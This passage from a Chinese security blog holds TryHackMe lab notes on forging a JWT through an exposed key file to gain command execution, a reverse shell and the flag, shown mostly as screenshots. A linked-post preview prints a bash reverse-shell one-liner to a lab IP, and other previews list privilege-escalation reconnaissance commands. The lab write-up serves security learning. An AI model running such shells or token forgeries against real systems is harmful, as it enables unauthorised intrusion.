<h2 id="rce（jwt伪造越权）"><a href="#rce（jwt伪造越权）" class="headerlink" title="rce（jwt伪造越权）"></a>rce（jwt伪造越权）</h2><p>可以执行命令<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609145134.png"><br>直接反弹shell试试，失败，过滤一堆啊<br>观察数据包发现用了jwt<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609145625.png"><br>解密看看结构<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609145714.png"><br>看到kid指向了key文件，联想ls列出了一个密钥文件<code>188ade1.key</code><br>访问就下载，里面的内容如下<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609150655.png"><br>可能是密钥什么的，先试着构造，时间戳调大一点<br><img src="/../../../images/Web_Application_Pentesting/ca7ac3543d67fdaf55965192dee74810.png"><br>替换显示验证失败，哦是不小心勾选了base64编码<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609154213.png"><br>然后验证成功<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609154148.png"><br>反弹shell看看<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609154331.png"><br>读flag<br><img src="/../../../images/Web_Application_Pentesting/Pasted%20image%2020250609154352.png"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://lan1oc.co">lan1oc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://lan1oc.co/2025/05/28/THM/[THM]Web%20Application%20Pentesting---Authentication%20%E8%AE%A4%E8%AF%81/">http://lan1oc.co/2025/05/28/THM/[THM]Web%20Application%20Pentesting---Authentication%20%E8%AE%A4%E8%AF%81/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://lan1oc.co" target="_blank">lan1ocのblog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/THM%E8%AE%B0%E5%BD%95/">THM记录</a></div><div class="post-share"><div class="social-share" data-image="/img/cover/4.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/05/28/THM/%5BTHM%5DPickle%20Rick/" title="[THM]Pickle Rick"><img class="cover" src="/img/cover/3.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">[THM]Pickle Rick</div></div><div class="info-2"><div class="info-item-1">一上来就是脑洞网站首页源码找到用户名扫目录扫到/robots.txt给了个字符串，推测是密码登录成功来到一个执行命令的页面先看看有啥 第一个flag1tac Sup3rS3cretPickl3Ingred.txt   12cat疑似被过滤   第二个flag谜语人啊，clue.txt说在其他目录能找到，但又没说在哪弹shell看看 1bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.21.170.43/404 0&gt;&amp;1&quot;  在/home/rick下找到 第三个flagsudo -i直接提权了然后在/root下找到 </div></div></div></a><a class="pagination-related" href="/2025/05/31/%E9%9A%8F%E7%AC%94/%E9%9A%8F%E7%AC%946---%E5%A4%B1%E8%B4%A5%E7%9A%84%E7%AB%AF%E5%8D%88%E5%87%BA%E8%A1%8C/" title="随笔6---失败的端午出行"><img class="cover" src="/img/cover/2.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">随笔6---失败的端午出行</div></div><div class="info-2"><div class="info-item-1">唉下雨5.30就来住酒店了，31感觉累然后也不知道去哪玩，就待酒店待了一天，然后也做做攻略，计划好去两个地方玩到了今天，woc下暴雨，会累，那tmd又要待酒店了，唉，等雨停了下去走走吧 酒店环境ok奥确实环境牛逼，听别人说是老四星 </div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/04/11/THM/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%5BTHM%5DLinux%20Privilege%20Escalation(linux%E6%8F%90%E6%9D%83)/" title="【学习笔记】[THM]Linux Privilege Escalation(linux提权)"><img class="cover" src="/img/cover/3.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-11</div><div class="info-item-2">【学习笔记】[THM]Linux Privilege Escalation(linux提权)</div></div><div class="info-2"><div class="info-item-1">信息收集假设已经拿下权限，那就先收集下这台机器的信息 主机名1hostname   系统信息1uname -a   内核版本和其他数据的信息1cat /proc/version   &#x2F;etc&#x2F;issue 系统版本1cat /etc/issue   看进程1234ps -A：查看所有正在运行的进程ps axjf：查看进程树（请参阅下面的树结构，直到运行 ps axjf）ps aux：aux 选项将显示所有用户的进程 （a），显示启动进程的用户 （u），并显示未连接到终端的进程 （x）。查看 ps aux 命令输出，我们可以更好地了解系统和潜在漏洞。  一般直接用 1ps -aux  看环境变量1env  重点看path变量PATH 变量可能具有编译器或脚本语言（例如 Python），可用于在目标系统上运行代码或用于权限提升。 看允许用户使用 root 权限运行哪些命令(鸡肋，要密码)1sudo -l  看用户组1id  也可看其他用户 1id root   &#x2F;etc&#x2F;passwd1cat...</div></div></div></a><a class="pagination-related" href="/2025/02/27/THM/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%5BTHM%5DRed%20Teaming--Intro%20to%20C2%EF%BC%88C2%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%EF%BC%89/" title="【学习笔记】[THM]Red Teaming--Intro to C2（C2服务器搭建）"><img class="cover" src="/img/cover/3.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-27</div><div class="info-item-2">【学习笔记】[THM]Red Teaming--Intro to C2（C2服务器搭建）</div></div><div class="info-2"><div class="info-item-1">设置C2服务器前提条件—下载msf采用一款免费的C2服务器–Armitage，他依赖msf框架，所以还是先下载msf官方给的下载方式 123curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \  chmod 755 msfinstall &amp;&amp; \  ./msfinstall  这一步会直接下载好依赖项和msf本身 安装Armitage下载、构建和安装 Armitage1git clone https://gitlab.com/kalilinux/packages/armitage.git &amp;&amp; cd armitage  然后运行构建脚本（在这一步之前首先要先装有java，版本不能太高java11就行sudo apt install openjdk-11-jdk） 1bash...</div></div></div></a><a class="pagination-related" href="/2025/03/02/THM/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%5BTHM%5DRed%20Teaming--Red%20Team%20Recon%EF%BC%88%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%89/" title="【学习笔记】[THM]Red Teaming--Red Team Recon（信息收集）"><img class="cover" src="/img/cover/4.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-02</div><div class="info-item-2">【学习笔记】[THM]Red Teaming--Red Team Recon（信息收集）</div></div><div class="info-2"><div class="info-item-1">内置工具（系统可识别并自下载的）whois一般能查到以下信息： 12345678910Registrar WHOIS server  注册 WHOIS 服务器Registrar URL  注册 URLRecord creation date  记录创建日期Record update date  记录更新日期Registrant contact info and address (unless withheld for privacy)注册人的联系信息和地址（除非出于隐私考虑而保留）Admin contact info and address (unless withheld for privacy)管理员联系信息和地址（除非出于隐私原因而保留）Tech contact info and address (unless withheld for privacy)技术联系信息和地址（除非出于隐私原因而隐瞒）  但一般都会有隐瞒，以我博客为例，基本全隐瞒了 nslookup使用默认 DNS 服务器来获取与域相关的 A 和 AAAA...</div></div></div></a><a class="pagination-related" href="/2025/03/09/THM/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%5BTHM%5DRed%20Teaming--Weaponization%EF%BC%88%E6%AD%A6%E5%99%A8%E5%8C%96%EF%BC%89/" title="【学习笔记】[THM]Red Teaming--Weaponization（武器化）"><img class="cover" src="/img/cover/2.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-09</div><div class="info-item-2">【学习笔记】[THM]Red Teaming--Weaponization（武器化）</div></div><div class="info-2"><div class="info-item-1">部署windows计算机要下载一个远程桌面的工具 1sudo apt install freerdp2-x11  然后按照的房间的提示启动 1xfreerdp /v:10.10.61.163 /u:thm /p:TryHackM3 +clipboard   wshWindows 脚本主机(wsh)是一个内置的 Windows 管理工具，它运行批处理文件以自动化和管理作系统中的任务cscript.exe（用于命令行脚本）和 wscript.exe（用于 UI 脚本），负责执行各种Microsoft Visual Basic 脚本 （VBScript），包括 vbs 和 vbe新建一个文件写入以下内容然后运行它（文件改不改名其实无所谓的） 1wscript 1.vbs   1cscript 1.vbs  将刚刚的脚本改成以下内容，然后重新运行，就弹计算器了 12Set shell = WScript.CreateObject(&quot;Wscript.Shell&quot;)shell.Run(&quot;C:\Windows\System32\calc.exe &quot;...</div></div></div></a><a class="pagination-related" href="/2025/04/22/THM/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%5BTHM%5DWindows%20Privilege%20Escalation(windows%E6%8F%90%E6%9D%83)/" title="【学习笔记】[THM]Windows Privilege Escalation(windows提权)"><img class="cover" src="/img/cover/1.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-22</div><div class="info-item-2">【学习笔记】[THM]Windows Privilege Escalation(windows提权)</div></div><div class="info-2"><div class="info-item-1">基本知识点Administrators组可以更改系统配置SYSTEM &#x2F; LocalSystem 帐户比管理员用户具有更多的权限Local Service用于以“最低”权限运行 Windows 服务的默认帐户。它将通过网络使用匿名连接Network Service用于以“最低”权限运行 Windows 服务的默认帐户。它将使用计算机凭据通过网络进行身份验证 收集密码的常用位置无人值守的 Windows 安装在大量主机上安装 Windows 时，管理员可以使用 Windows...</div></div></div></a><a class="pagination-related" href="/2025/03/13/THM/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%5BTHM%5Dffuf/" title="【学习笔记】[THM]ffuf"><img class="cover" src="/img/cover/4.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-13</div><div class="info-item-2">【学习笔记】[THM]ffuf</div></div><div class="info-2"><div class="info-item-1">基本使用直接扫网站就行了，根据之前的提示 1./ffuf -u http://10.10.127.184/FUZZ -w ../SecLists/Discovery/Web-Content/big.txt  回答问题：您找到的第一个状态代码为 200 的文件是什么？ 查找页面和目录使用通用文件列表（如 raft-medium-files-lowercase.txt）开始枚举 1./ffuf -u http://10.10.127.184/FUZZ -w ../SecLists/Discovery/Web-Content/raft-medium-files-lowercase.txt  对应第一个问题：您找到的是什么文本文件？ 尝试仅针对索引页面的常见扩展 1./ffuf -u http://10.10.127.184/indexFUZZ -w ../SecLists/Discovery/Web-Content/web-extensions.txt  对应第二个问题：为索引页找到哪两个文件扩展名？ 从此单词列表中排除 4 个字母的扩展名，因为它会导致许多误报 1./ffuf -u...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/joker.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">lan1oc</div><div class="author-info-description">57qv6I+c54uX572i5LqG</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">67</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lan1oc"><i class="fab fa-github"></i><span>没啥用的仓库</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">随便写写</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">1.</span> <span class="toc-text">基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#session"><span class="toc-number">1.1.</span> <span class="toc-text">session</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie"><span class="toc-number">1.1.1.</span> <span class="toc-text">cookie</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B1%9E%E6%80%A7"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">属性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#token"><span class="toc-number">1.1.2.</span> <span class="toc-text">token</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Token-Based-Session-Management"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">Token-Based Session Management</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A5%E5%89%8D%E7%9A%84%E7%9B%B2%E7%82%B9"><span class="toc-number">1.1.3.</span> <span class="toc-text">以前的盲点</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JWT"><span class="toc-number">2.</span> <span class="toc-text">JWT</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7"><span class="toc-number">2.1.</span> <span class="toc-text">在线工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#curl%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8"><span class="toc-number">2.1.1.</span> <span class="toc-text">curl命令使用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AA%E9%AA%8C%E8%AF%81"><span class="toc-number">2.2.</span> <span class="toc-text">未验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%90%8D%E7%AE%97%E6%B3%95%E9%99%8D%E7%BA%A7%E4%B8%BAnone"><span class="toc-number">2.3.</span> <span class="toc-text">签名算法降级为none</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E5%AF%B9%E7%A7%B0%E5%AF%86%E9%92%A5%E7%AD%BE%E5%90%8D"><span class="toc-number">2.4.</span> <span class="toc-text">弱对称密钥签名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%90%8D%E7%AE%97%E6%B3%95%E6%B7%B7%E6%B7%86"><span class="toc-number">2.5.</span> <span class="toc-text">签名算法混淆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E4%B8%8D%E8%BF%87%E6%9C%9F"><span class="toc-number">2.6.</span> <span class="toc-text">令牌不过期</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E6%9C%8D%E5%8A%A1%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB"><span class="toc-number">2.7.</span> <span class="toc-text">跨服务中继攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#OAuth-%E6%BC%8F%E6%B4%9E-OAuth-2-0%EF%BC%8C%E5%8D%B3%E5%B8%B8%E7%94%A8%E7%9A%84%E6%8E%88%E6%9D%83%E6%A1%86%E6%9E%B6"><span class="toc-number">3.</span> <span class="toc-text">OAuth 漏洞(OAuth 2.0，即常用的授权框架)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">3.1.</span> <span class="toc-text">一些基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8A%B6%E6%80%81%E5%8F%82%E6%95%B0"><span class="toc-number">3.1.1.</span> <span class="toc-text">状态参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%88%E6%9D%83%E7%B1%BB%E5%9E%8B%EF%BC%88%E6%9C%8D%E5%8A%A1%E5%99%A8-%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BA%A4%E4%BA%92%E5%B8%B8%E7%94%A8%E7%9A%84%E6%8E%88%E6%9D%83%E7%B1%BB%E5%9E%8B%E6%98%AF%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%87%AD%E8%AF%81%E6%8E%88%E4%BA%88%EF%BC%89"><span class="toc-number">3.1.2.</span> <span class="toc-text">授权类型（服务器-服务器交互常用的授权类型是客户端凭证授予）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%88%E6%9D%83%E7%A0%81%E6%8E%88%E4%BA%88"><span class="toc-number">3.1.2.1.</span> <span class="toc-text">授权码授予</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%90%E5%BC%8F%E6%8E%88%E6%9D%83"><span class="toc-number">3.1.2.2.</span> <span class="toc-text">隐式授权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E6%89%80%E6%9C%89%E8%80%85%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E6%8E%88%E4%BA%88"><span class="toc-number">3.1.2.3.</span> <span class="toc-text">资源所有者密码凭证授予</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%87%AD%E8%AF%81%E6%8E%88%E4%BA%88"><span class="toc-number">3.1.2.3.1.</span> <span class="toc-text">客户端凭证授予</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">3.2.</span> <span class="toc-text">利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%83%E5%8F%96-OAuth-%E4%BB%A4%E7%89%8C"><span class="toc-number">3.2.1.</span> <span class="toc-text">窃取 OAuth 令牌</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">3.2.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D"><span class="toc-number">3.2.1.2.</span> <span class="toc-text">实操</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OAuth-%E4%B8%AD%E7%9A%84-CSRF"><span class="toc-number">3.2.2.</span> <span class="toc-text">OAuth 中的 CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%EF%BC%88%E7%BC%BA%E5%B0%91-state-%E5%8F%82%E6%95%B0%E7%9A%84csrf%EF%BC%89"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">原理（缺少 state 参数的csrf）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E6%8F%90"><span class="toc-number">3.2.2.2.</span> <span class="toc-text">前提</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D%EF%BC%88%E7%BC%BA%E5%B0%91-state-%E5%8F%82%E6%95%B0%EF%BC%89"><span class="toc-number">3.2.2.3.</span> <span class="toc-text">实操（缺少 state 参数）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5url%E5%8F%82%E6%95%B0"><span class="toc-number">3.2.2.3.1.</span> <span class="toc-text">检查url参数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.2.3.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%90%E5%BC%8F%E6%8E%88%E6%9D%83-1"><span class="toc-number">3.2.3.</span> <span class="toc-text">隐式授权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%BA%E9%99%B7"><span class="toc-number">3.2.3.1.</span> <span class="toc-text">缺陷</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-xss%E6%94%BB%E5%87%BB"><span class="toc-number">3.2.3.2.</span> <span class="toc-text">实操(xss攻击)</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%9A%E5%9B%A0%E7%B4%A0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">4.</span> <span class="toc-text">多因素身份验证</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.1.</span> <span class="toc-text">常见漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">4.2.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OTP-%E6%B3%84%E6%BC%8F"><span class="toc-number">4.2.1.</span> <span class="toc-text">OTP 泄漏</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">4.2.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-1"><span class="toc-number">4.2.1.2.</span> <span class="toc-text">实操</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E6%88%96%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E7%BC%96%E7%A0%81"><span class="toc-number">4.2.2.</span> <span class="toc-text">逻辑缺陷或不安全的编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E8%87%AA%E5%8A%A8%E6%B3%A8%E9%94%80%E5%8A%9F%E8%83%BD"><span class="toc-number">4.2.3.</span> <span class="toc-text">绕过自动注销功能</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%EF%BC%9Aevilginx"><span class="toc-number">4.3.</span> <span class="toc-text">工具使用：evilginx</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E6%B5%8B%E8%AF%95"><span class="toc-number">5.</span> <span class="toc-text">综合测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%872fa%E7%99%BB%E5%BD%95"><span class="toc-number">5.1.</span> <span class="toc-text">绕过2fa登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rce%EF%BC%88jwt%E4%BC%AA%E9%80%A0%E8%B6%8A%E6%9D%83%EF%BC%89"><span class="toc-number">5.2.</span> <span class="toc-text">rce（jwt伪造越权）</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/06/18/%E5%BB%BA%E7%AB%99/%E5%8D%9A%E5%AE%A2%E6%81%A2%E5%A4%8D/" title="博客恢复"><img src="/img/cover/4.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="博客恢复"/></a><div class="content"><a class="title" href="/2025/06/18/%E5%BB%BA%E7%AB%99/%E5%8D%9A%E5%AE%A2%E6%81%A2%E5%A4%8D/" title="博客恢复">博客恢复</a><time datetime="2025-06-17T16:00:00.000Z" title="发表于 2025-06-18 00:00:00">2025-06-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/05/src/%5Bsrc%5D%E9%A9%AC%E4%B8%8A%E6%B6%88%E8%B4%B9src%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/" title="[src]马上消费src基本信息"><img src="/img/cover/1.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[src]马上消费src基本信息"/></a><div class="content"><a class="title" href="/2025/06/05/src/%5Bsrc%5D%E9%A9%AC%E4%B8%8A%E6%B6%88%E8%B4%B9src%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/" title="[src]马上消费src基本信息">[src]马上消费src基本信息</a><time datetime="2025-06-05T08:00:00.000Z" title="发表于 2025-06-05 16:00:00">2025-06-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/05/%E5%80%BC%E5%AE%88/%E5%80%BC%E5%AE%884/" title="值守4"><img src="/img/cover/3.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="值守4"/></a><div class="content"><a class="title" href="/2025/06/05/%E5%80%BC%E5%AE%88/%E5%80%BC%E5%AE%884/" title="值守4">值守4</a><time datetime="2025-06-05T08:00:00.000Z" title="发表于 2025-06-05 16:00:00">2025-06-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/04/%E5%80%BC%E5%AE%88/%E5%80%BC%E5%AE%883/" title="值守3"><img src="/img/cover/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="值守3"/></a><div class="content"><a class="title" href="/2025/06/04/%E5%80%BC%E5%AE%88/%E5%80%BC%E5%AE%883/" title="值守3">值守3</a><time datetime="2025-06-04T08:00:00.000Z" title="发表于 2025-06-04 16:00:00">2025-06-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/03/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01/" title="内网渗透学习1"><img src="/img/cover/3.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透学习1"/></a><div class="content"><a class="title" href="/2025/06/03/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01/" title="内网渗透学习1">内网渗透学习1</a><time datetime="2025-06-03T08:00:00.000Z" title="发表于 2025-06-03 16:00:00">2025-06-03</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/5.webp);"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By lan1oc</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>